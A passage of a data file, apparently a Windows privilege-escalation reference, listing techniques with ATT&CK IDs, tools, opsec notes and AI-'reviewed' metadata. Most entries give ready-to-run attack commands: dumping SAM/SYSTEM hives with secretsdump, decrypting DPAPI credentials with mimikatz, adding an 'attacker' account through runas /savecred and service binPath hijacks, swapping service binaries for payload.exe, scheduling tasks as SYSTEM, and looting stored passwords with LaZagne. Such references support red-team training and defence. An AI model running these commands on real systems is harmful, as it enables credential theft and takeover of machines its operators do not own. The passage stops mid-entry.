    "commands": [
      {
        "label": "Create + run a SYSTEM task",
        "code": "schtasks /create /tn sysT /tr \"C:\\Temp\\payload.exe\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn sysT",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1053.005",
      "url": "https://attack.mitre.org/techniques/T1053/005/"
    },
    "requires": [
      "High-integrity administrator context"
    ],
    "opsec": "Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.",
    "references": [
      {
        "label": "Microsoft, Security Contexts for Tasks",
        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
        "section": "Opening context definition; Specifying Credentials; task permissions",
        "kind": "primary"
      },
      {
        "label": "Microsoft, LocalSystem Account",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
        "section": "Opening account definition",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions.",
        "commands": [
          {
            "code": "schtasks /create /tn sysT /tr \"C:\\Temp\\payload.exe\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn sysT",
            "label": "Create + run a SYSTEM task",
            "lang": "cmd"
          }
        ],
        "description": "A scheduled task has a security context associated with an account or group. LocalSystem is one Windows account identity, with extensive privileges on the local computer, and is separate from a logged-on user's account. The task's configured identity describes its execution context; the Task Scheduler label alone does not identify that account.",
        "id": "pe-admin-schtask-system",
        "label": "Scheduled Task as SYSTEM",
        "mitre": {
          "id": "T1053.005",
          "url": "https://attack.mitre.org/techniques/T1053/005/"
        },
        "opsec": "Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.",
        "phase": "admin",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Security Contexts for Tasks",
            "section": "Opening context definition; Specifying Credentials; task permissions",
            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          },
          {
            "kind": "primary",
            "label": "Microsoft, LocalSystem Account",
            "section": "Opening account definition",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          }
        ],
        "requires": [
          "High-integrity administrator context"
        ],
        "summary": "Understand LocalSystem as a scheduled task's execution identity.",
        "tools": [
          {
            "name": "schtasks (built-in)",
            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
          }
        ]
      },
      "claims": [
        {
          "text": "A scheduled task has a security context associated with the account or group specified for it.",
          "section": "Microsoft, Security Contexts for Tasks — Specifying Credentials",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          ]
        },
        {
          "text": "LocalSystem has extensive local privileges and is not associated with a logged-on user account.",
          "section": "Microsoft, LocalSystem Account — Opening account definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          ]
        }
      ]
    }
  },
  {
    id: 'pe-admin-token',
    label: 'Token Impersonation (getsystem)',
    phase: 'admin',
    summary: 'Duplicate a SYSTEM process token.',
    affects: 'All supported Windows versions (token model).',
    description: r`A high-integrity administrator can enable SeDebugPrivilege, open a process already running as SYSTEM (e.g. winlogon.exe), duplicate its token with DuplicateTokenEx, and spawn a new process with it: the manual / incognito / PowerSploit approach. Meterpreter getsystem reaches the same outcome differently: its token-duplication technique enumerates a service running as SYSTEM and reflectively injects into it to grab that service's token, and its other techniques use named-pipe impersonation.`,
    tools: [{ name: 'Meterpreter (getsystem)', url: 'https://github.com/rapid7/metasploit-framework' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'MITRE T1134.001, Token Impersonation', url: 'https://attack.mitre.org/techniques/T1134/001/' }],
    requires: ['High-integrity administrator context (SeDebugPrivilege for token duplication; service-creation/SeImpersonate for the named-pipe technique)'],
    opsec: 'A handle to winlogon.exe (or another SYSTEM process), service creation, named-pipe impersonation, and reflective injection into a SYSTEM service are top-tier EDR detections.',
  },

  // ── Stored Credentials ──────────────────────────────────────────────────────
  {
    id: 'pe-sam-system-dump',
    label: 'SAM & SYSTEM Hive Dump',
    phase: 'finding',
    summary: 'Save SAM+SYSTEM, extract local hashes offline.',
    affects: 'All supported Windows versions (depends on read access to the hives).',
    description: r`Save the SAM and SYSTEM registry hives and process them offline to recover local NTLM hashes (the SYSTEM hive holds the bootkey that decrypts SAM). The reg save command below operates on the live registry and needs backup semantics (admin, SeBackup, or Backup Operators) at runtime; a read ACL on the hive files alone is not enough for it. The case where a misconfigured ACL lets an unprivileged user read the on-disk hive files (out of a shadow copy, no backup privilege) is HiveNightmare/SeriousSAM, covered separately. A cracked or passed-the-hash local admin enables lateral movement.`,
    tools: [{ name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Save hives', code: r`reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
      { label: 'Dump offline', code: r`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`, lang: 'bash' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'NVD, CVE-2021-36934 (HiveNightmare / SeriousSAM)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-36934' }],
    requires: ['Backup semantics for reg save: admin, SeBackup/SeRestore, or Backup Operators (a file-read ACL alone is the HiveNightmare path)'],
    opsec: 'reg save of SAM/SYSTEM is a known credential-dumping IOC. Offline parsing on the attacker host is invisible.',
  },
  {
    id: 'pe-dpapi-creds',
    label: 'DPAPI Secrets',
    phase: 'finding',
    summary: 'Decrypt DPAPI-protected creds/vaults with masterkeys.',
    affects: 'All supported Windows versions.',
    description: r`Windows Credential Manager entries and vaults are DPAPI-protected. With the user password (or SYSTEM access to the masterkey, or a domain DPAPI backup key) decrypt the masterkey, then the credential blobs. SharpDPAPI / mimikatz automate this. Chrome/modern-Edge saved logins are also DPAPI-wrapped but live in the browser's own Login Data store and are classified separately as T1555.003 (Credentials from Web Browsers); only IE/legacy-Edge web credentials land in Credential Manager (T1555.004).`,
    tools: [
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Decrypt a masterkey (known password)', code: r`dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<GUID>" /sid:<SID> /password:<pw>`, lang: 'cmd' },
      { label: 'Decrypt a credential blob (check both %LOCALAPPDATA%\\Microsoft\\Credentials\\ and %APPDATA%\\Microsoft\\Credentials\\)', code: r`dpapi::cred /in:"%LOCALAPPDATA%\Microsoft\Credentials\<blob>" /masterkey:<key>`, lang: 'cmd' },
    ],
    mitre: mitre('T1555.004'),
    references: [
      { label: 'harmj0y, Operational Guidance for Offensive User DPAPI Abuse', url: 'https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/' },
      { label: 'HackTricks, DPAPI Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },
    ],
    requires: ['User context / password, or SYSTEM, or the domain DPAPI backup key'],
    opsec: 'Reading masterkey + Credentials files and invoking DPAPI is detectable via file access patterns and known tool signatures.',
  },
  {
    id: 'pe-stored-creds',
    label: 'Saved Credentials (cmdkey)',
    phase: 'finding',
    summary: 'Reuse cmdkey-saved creds via runas /savecred.',
    affects: 'All supported Windows versions.',
    description: r`cmdkey /list reveals credentials saved in Credential Manager. If an admin credential was saved by a prior runas /savecred (an interactive-logon-type credential), run commands as that user with runas /savecred without knowing the password, directly inheriting their privileges. Note that credentials merely added with cmdkey /add or /generic are a different credential type and are generally NOT accepted by runas /savecred.`,
    tools: [
      { name: 'cmdkey (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey' },
      { name: 'runas (built-in)', url: 'https://ss64.com/nt/runas.html' },
    ],
    commands: [
      { label: 'List stored creds', code: r`cmdkey /list`, lang: 'cmd' },
      { label: 'Run as the saved (admin) user (/user: must match the exact target shown by cmdkey /list, e.g. HOSTNAME\\Administrator or DOMAIN\\svc_admin)', code: r`runas /savecred /user:HOSTNAME\Administrator "cmd /c net localgroup administrators attacker /add"`, lang: 'cmd' },
    ],
    mitre: mitre('T1078.003'),
    references: [{ label: 'HackingArticles, Stored Credentials (Runas)', url: 'https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/' }],
    requires: ['A privileged credential previously saved by runas /savecred (interactive-logon type) in Credential Manager'],
    opsec: 'Low-noise; uses built-in tools. The runas-spawned process tree under a different user is the main signal.',
  },
  {
    id: 'pe-winlogon-autologon',
    label: 'Winlogon Autologon',
    phase: 'finding',
    summary: 'Read a cleartext autologon password from the registry.',
    affects: 'All supported Windows versions, only when autologon is configured via the registry (manual KB 324737 path). Autologon set up with Sysinternals Autologon.exe stores the secret as an LSA secret instead, so there is no cleartext DefaultPassword to read.',
    description: r`When automatic logon is configured manually via the registry (KB 324737), Windows stores the account name and its password in cleartext under the Winlogon registry key (DefaultUserName / DefaultPassword, with AutoAdminLogon = 1), and any user can read these values. If the autologon account is a local or domain admin, you have its password directly, no cracking required. This does NOT hold for autologon set up with Sysinternals Autologon.exe: that tool stores the secret as the LSA secret DefaultPassword under HKLM\SECURITY\Policy\Secrets (admin/SYSTEM ACL), so the reg query below returns nothing and recovery needs lsadump / SeSecurityPrivilege instead.`,
    tools: [{ name: 'reg (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg' }],
    commands: [
      { label: 'Read the autologon values (query the whole key to surface AutoAdminLogon + DefaultUserName/DefaultDomainName/DefaultPassword together)', code: r`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`, lang: 'cmd' },
    ],
    mitre: mitre('T1552.002'),
    references: [
      { label: 'Microsoft, KB 324737: Configure Windows to automate logon', url: 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon' },
      { label: 'MITRE T1552.002, Credentials in Registry', url: 'https://attack.mitre.org/techniques/T1552/002/' },
    ],
    requires: ['Autologon configured with a stored DefaultPassword'],
    opsec: 'Read-only registry query; very quiet. The cleartext password is only present when autologon was configured via the registry; an Autologon.exe-configured host has no DefaultPassword value and needs an LSA-secret dump (noisier, admin-only) instead.',
  },
  {
    id: 'pe-hivenightmare',
    label: 'HiveNightmare / SeriousSAM',
    phase: 'finding',
    summary: 'CVE-2021-36934: any user reads SAM via a shadow copy.',
    affects: 'Windows 10 1809–21H1, Windows 11 21H2, and Server 2019 / 2022, pre-patch (patched Aug 2021).',
    versions: [...range('win10-1809', 'win10-21h1'), 'win11-21h2', 'srv2019', 'srv2022'],
    description: r`On affected Windows 10/11 builds the ACLs on C:\Windows\System32\config\SAM, SYSTEM and SECURITY mistakenly granted BUILTIN\Users read access. A non-admin can read these hives out of a Volume Shadow Copy and extract the local-admin hash offline: no SeBackup, no admin token required. Mitigated by patching, fixing the ACLs, and deleting existing shadow copies.`,
    tools: [
      { name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' },
      { name: 'HiveNightmare PoC', url: 'https://github.com/GossiTheDog/HiveNightmare' },
    ],
    commands: [
      { label: 'Confirm the over-permissive ACL', code: r`icacls C:\Windows\System32\config\SAM`, lang: 'cmd' },
      { label: 'Extract in-use hives from a shadow copy (produces SAM-haxx etc.)', code: r`HiveNightmare.exe`, lang: 'cmd' },
      { label: 'Dump the extracted hives offline', code: r`impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`, lang: 'bash' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'MSRC, CVE-2021-36934', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934' }],
    requires: ['Unpatched vulnerable build', 'At least one VSS shadow copy present'],
    opsec: 'The raw offline hive read is quiet, but running icacls against the config hives and touching a shadow copy are both documented HiveNightmare detection signatures (Defender/Splunk/SOC Prime), so on a monitored host this is not silent. It depends on a shadow copy existing. Fully patched/mitigated systems are not affected.',
  },
  {
    id: 'pe-powershell-history',
    label: 'PowerShell History',
    phase: 'finding',
    summary: 'Read PSReadLine command history for secrets.',
    affects: 'All supported Windows versions with PowerShell 5+ / PSReadLine.',
    description: r`PSReadLine saves every PowerShell command to ConsoleHost_history.txt in the user profile, readable by its owner. Administrators routinely paste passwords, connection strings, and API keys into PowerShell, so your own history file is a reliable, no-privilege credential source. Reading OTHER users' histories under C:\Users\* needs local admin, since each profile's AppData is ACL'd to the owner, SYSTEM, and Administrators only.`,
    tools: [{ name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' }],
    commands: [
      { label: 'Read your own history file (no privilege)', code: r`type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`, lang: 'cmd' },
      { label: 'All users (requires local admin: reads other profiles)', code: r`gc C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, lang: 'powershell' },
    ],
    mitre: mitre('T1552.003'),
    references: [{ label: 'MITRE T1552.003, Shell History', url: 'https://attack.mitre.org/techniques/T1552/003/' }],
    requires: ['A PowerShell history file containing a secret'],
    opsec: 'Reading your own file is silent. The all-users wildcard read is admin-only and can generate access-denied noise or file-access audit events (4663) across other users\' profiles. Depends on a user having typed a secret.',
  },
  {
    id: 'pe-config-password-hunt',
    label: 'Files & Configs with Secrets',
    phase: 'finding',
    summary: 'Hunt secrets across configs, scripts, and user artifacts.',
    affects: 'All supported Windows versions (some artifact paths, e.g. Sticky Notes / Notepad tabs, vary by build).',
    description: r`Credentials hide all over the filesystem: unattended-install files (Unattend.xml, sysprep, Autounattend.xml under C:\Windows\Panther\), application configs (web.config, *.config, appsettings.json), scripts and .bat/.ps1 files, and user artifacts: the Recycle Bin, Sticky Notes (plum.sqlite), unsaved Notepad tabs (Windows 11 TabState), and custom config files. Grep broadly for password/key patterns; winPEAS and LaZagne automate most of these locations.`,
    tools: [
      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
    ],
    commands: [
      { label: 'Recursive password grep', code: r`findstr /si password *.xml *.ini *.txt *.config *.json`, lang: 'cmd' },
      { label: 'Unattend / sysprep files', code: r`dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\System32\sysprep\*.xml`, lang: 'cmd' },
      { label: 'Sticky Notes store', code: r`dir /s C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_*\LocalState\plum.sqlite`, lang: 'cmd' },
    ],
    mitre: mitre('T1552.001'),
    references: [
      { label: 'MITRE T1552.001, Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' },
      { label: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
    ],
    requires: ['Readable files that contain credentials'],
    opsec: 'Read-only hunting is quiet; broad recursive searches can be noisy on disk-access auditing.',
  },
  {
    id: 'pe-password-managers',
    label: 'Password Managers & Browsers',
    phase: 'finding',
    summary: 'Loot KeePass / browser stores for saved logins.',
    affects: 'Depends on the installed application, not the Windows build.',
    description: r`Locally stored vaults are high-value: KeePass .kdbx databases (and the KeePass 2.x CVE-2023-32784 master-password memory leak), browser-saved logins (Chrome/Edge "Login Data" SQLite, DPAPI-protected), and config files for other managers. LaZagne pulls credentials from dozens of such apps in one pass. Password-manager theft is T1555.005; browser-saved login theft is the distinct sub-technique T1555.003 (Credentials from Web Browsers).`,
    tools: [
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
      { name: 'KeePass CVE-2023-32784 PoC', url: 'https://github.com/vdohney/keepass-password-dumper' },
    ],
    commands: [
      { label: 'Find KeePass databases', code: r`dir /s /b C:\Users\*.kdbx`, lang: 'cmd' },
      { label: 'LaZagne, all modules', code: r`lazagne.exe all`, lang: 'cmd' },
    ],
    mitre: mitre('T1555.005'),
    references: [
      { label: 'MITRE T1555.005, Password Managers', url: 'https://attack.mitre.org/techniques/T1555/005/' },
      { label: 'MITRE T1555.003, Credentials from Web Browsers', url: 'https://attack.mitre.org/techniques/T1555/003/' },
      { label: 'NVD, CVE-2023-32784 (KeePass master password in memory)', url: 'https://nvd.nist.gov/vuln/detail/cve-2023-32784' },
    ],
    requires: ['A local vault or browser store plus the user context / DPAPI (or its key) for kdbx and browser looting; the KeePass CVE-2023-32784 path instead needs a KeePass process-memory dump, not the master password'],
    opsec: 'Reading browser/KeePass files is quiet; LaZagne is AV-signatured.',
  },

  // ── Service Misconfigurations ───────────────────────────────────────────────
  {
    "id": "pe-unquoted-service-path",
    "label": "Unquoted Service Path",
    "phase": "finding",
    "summary": "Understand service startup configuration and executable-path records.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "Windows uses service configuration to determine how a service starts. The Service Control Manager maintains installed-service records that include the executable path and other startup information. Understanding the stored path begins with distinguishing service configuration from the executable file it names.",
    "tools": [
      {
        "name": "WinPEAS",
        "url": "https://github.com/peass-ng/PEASS-ng"
      },
      {
        "name": "PowerUp",
        "url": "https://github.com/PowerShellMafia/PowerSploit"
      }
    ],
    "commands": [
      {
        "label": "Find unquoted paths with spaces",
        "code": "Get-WmiObject win32_service | ? { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' } | select Name, PathName",
        "lang": "powershell"
      },
      {
        "label": "Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)",
        "code": "sc stop <service> & sc query <service> | findstr STOPPED & sc start <service>",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1574.009",
      "url": "https://attack.mitre.org/techniques/T1574/009/"
    },
    "requires": [
      "Service with an unquoted path + space",
      "Write access to an intermediate directory",
      "Ability to restart the service or reboot"
    ],
    "opsec": "A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.",
    "references": [
      {
        "label": "Microsoft — Service Configuration",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Database of Installed Services",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "Get-WmiObject win32_service | ? { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' } | select Name, PathName",
            "label": "Find unquoted paths with spaces",
            "lang": "powershell"
          },
          {
            "code": "sc stop <service> & sc query <service> | findstr STOPPED & sc start <service>",
            "label": "Restart the service to trigger (sc stop is async and returns before STOPPED, so the start can race error 1061; poll or wait, e.g. sc query ... | findstr STOPPED, or rely on the auto-start-on-reboot path)",
            "lang": "cmd"
          }
        ],
        "description": "Windows uses service configuration to determine how a service starts. The Service Control Manager maintains installed-service records that include the executable path and other startup information. Understanding the stored path begins with distinguishing service configuration from the executable file it names.",
        "id": "pe-unquoted-service-path",
        "label": "Unquoted Service Path",
        "mitre": {
          "id": "T1574.009",
          "url": "https://attack.mitre.org/techniques/T1574/009/"
        },
        "opsec": "A new EXE in an unusual path + service crash/restart events are detectable. The service runs your binary as its (often SYSTEM) account.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Service Configuration",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Database of Installed Services",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
          }
        ],
        "requires": [
          "Service with an unquoted path + space",
          "Write access to an intermediate directory",
          "Ability to restart the service or reboot"
        ],
        "summary": "Understand service startup configuration and executable-path records.",
        "tools": [
          {
            "name": "WinPEAS",
            "url": "https://github.com/peass-ng/PEASS-ng"
          },
          {
            "name": "PowerUp",
            "url": "https://github.com/PowerShellMafia/PowerSploit"
          }
        ]
      },
      "claims": [
        {
          "text": "Windows uses service configuration information to determine how to start a service.",
          "section": "Microsoft — Service Configuration — Opening configuration definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-configuration"
          ]
        },
        {
          "text": "The Service Control Manager's installed-service database includes the fully qualified executable path.",
          "section": "Microsoft — Database of Installed Services — Installed-service information: executable-path item",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-weak-service-perms",
    "label": "Weak Service Permissions (binPath)",
    "phase": "finding",
    "summary": "Distinguish access to service objects from access to files.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "The Windows access-control model governs access to the Service Control Manager and individual service objects. Files are also securable objects with their own security descriptors. A service object and its executable file are separate objects when describing permissions.",
    "tools": [
      {
        "name": "SharpUp",
        "url": "https://github.com/GhostPack/SharpUp"
      },
      {
        "name": "accesschk (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
      }
    ],
    "commands": [
      {
        "label": "Enumerate modifiable services",
        "code": "accesschk.exe -uwcqv \"Users\" * /accepteula",
        "lang": "cmd"
      },
      {
        "label": "Hijack binPath (note the space after '=')",
        "code": "sc config <service> binpath= \"net localgroup administrators attacker /add\"",
        "lang": "cmd"
      },
      {
        "label": "Trigger",
        "code": "sc stop <service> & sc start <service>",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1543.003",
      "url": "https://attack.mitre.org/techniques/T1543/003/"
    },
    "requires": [
      "SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service",
      "Ability to start/stop it"
    ],
    "opsec": "sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.",
    "references": [
      {
        "label": "Microsoft — Service Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights",
        "kind": "primary"
      },
      {
        "label": "Microsoft — File Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "accesschk.exe -uwcqv \"Users\" * /accepteula",
            "label": "Enumerate modifiable services",
            "lang": "cmd"
          },
          {
            "code": "sc config <service> binpath= \"net localgroup administrators attacker /add\"",
            "label": "Hijack binPath (note the space after '=')",
            "lang": "cmd"
          },
          {
            "code": "sc stop <service> & sc start <service>",
            "label": "Trigger",
            "lang": "cmd"
          }
        ],
        "description": "The Windows access-control model governs access to the Service Control Manager and individual service objects. Files are also securable objects with their own security descriptors. A service object and its executable file are separate objects when describing permissions.",
        "id": "pe-weak-service-perms",
        "label": "Weak Service Permissions (binPath)",
        "mitre": {
          "id": "T1543.003",
          "url": "https://attack.mitre.org/techniques/T1543/003/"
        },
        "opsec": "sc config changes and the service failing to return a control response are logged. The command still executes before the SCM errors out.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Service Security and Access Rights",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
          },
          {
            "kind": "primary",
            "label": "Microsoft — File Security and Access Rights",
            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          }
        ],
        "requires": [
          "SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a privileged service",
          "Ability to start/stop it"
        ],
        "summary": "Distinguish access to service objects from access to files.",
        "tools": [
          {
            "name": "SharpUp",
            "url": "https://github.com/GhostPack/SharpUp"
          },
          {
            "name": "accesschk (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
          }
        ]
      },
      "claims": [
        {
          "text": "Windows access control applies to the Service Control Manager and service objects.",
          "section": "Microsoft — Service Security and Access Rights — Opening access-control definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
          ]
        },
        {
          "text": "Files are securable objects whose access is governed by Windows access control and security descriptors.",
          "section": "Microsoft — File Security and Access Rights — Opening definition; Security descriptors",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-insecure-service-binary",
    "label": "Writable Service Binary",
    "phase": "finding",
    "summary": "Distinguish executable-file access from a service's account identity.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "Windows regulates access to files through its access-control model. Separately, each service runs in an account's security context. The permissions on an executable file and the identity of the process using it describe different parts of the security model.",
    "tools": [
      {
        "name": "accesschk (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
      },
      {
        "name": "PowerUp",
        "url": "https://github.com/PowerShellMafia/PowerSploit"
      }
    ],
    "commands": [
      {
        "label": "Check write access to a service binary",
        "code": "accesschk.exe -quvw \"Users\" \"C:\\Path\\To\\service.exe\" /accepteula",
        "lang": "cmd"
      },
      {
        "label": "Stop, replace, restart (running service locks its EXE)",
        "code": "sc stop <service> & copy /y payload.exe \"C:\\Path\\To\\service.exe\" & sc start <service>",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1574.010",
      "url": "https://attack.mitre.org/techniques/T1574/010/"
    },
    "requires": [
      "Write/modify permission on the service EXE or its directory",
      "Service runs as SYSTEM/elevated",
      "Ability to restart it"
    ],
    "opsec": "File-modification + service-restart events. Back up the original binary to restore the service afterward.",
    "references": [
      {
        "label": "Microsoft — File Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Service User Accounts",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected foundational definitions of authentication, Windows management, service configuration and securable objects. These sources support only the listed conceptual claims. Excludes technique mechanics, commands, tools, prerequisites, applicability, version or algorithm details, connection outcomes, attack-path viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (configuration weakness).",
        "commands": [
          {
            "code": "accesschk.exe -quvw \"Users\" \"C:\\Path\\To\\service.exe\" /accepteula",
            "label": "Check write access to a service binary",
            "lang": "cmd"
          },
          {
            "code": "sc stop <service> & copy /y payload.exe \"C:\\Path\\To\\service.exe\" & sc start <service>",
            "label": "Stop, replace, restart (running service locks its EXE)",
            "lang": "cmd"
          }
        ],
        "description": "Windows regulates access to files through its access-control model. Separately, each service runs in an account's security context. The permissions on an executable file and the identity of the process using it describe different parts of the security model.",
        "id": "pe-insecure-service-binary",
        "label": "Writable Service Binary",
        "mitre": {
          "id": "T1574.010",
          "url": "https://attack.mitre.org/techniques/T1574/010/"
        },
        "opsec": "File-modification + service-restart events. Back up the original binary to restore the service afterward.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — File Security and Access Rights",
            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Service User Accounts",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          }
        ],
        "requires": [
          "Write/modify permission on the service EXE or its directory",
          "Service runs as SYSTEM/elevated",
          "Ability to restart it"
        ],
        "summary": "Distinguish executable-file access from a service's account identity.",
        "tools": [
          {
            "name": "accesschk (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
          },
          {
            "name": "PowerUp",
            "url": "https://github.com/PowerShellMafia/PowerSploit"
          }
        ]
      },
      "claims": [
        {
          "text": "Windows treats files as securable objects subject to its access-control model.",
          "section": "Microsoft — File Security and Access Rights — Opening file-security definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
          ]
        },
        {
          "text": "Each Windows service runs in the security context of an account.",
          "section": "Microsoft — Service User Accounts — Opening service-account definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-weak-registry-service",
    "label": "Weak Service Registry Perms",
    "phase": "finding",
    "summary": "Understand registry access control and installed-service records.",
    "affects": "All supported Windows versions (configuration weakness).",
    "description": "Registry keys have security descriptors and access rights in the Windows security model. The Service Control Manager stores its installed-service database in the registry. Registry permissions describe access to stored configuration; the service database describes the installed services.",
    "tools": [
      {
        "name": "accesschk (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
      }
    ],
    "commands": [
      {
        "label": "Find writable service keys",
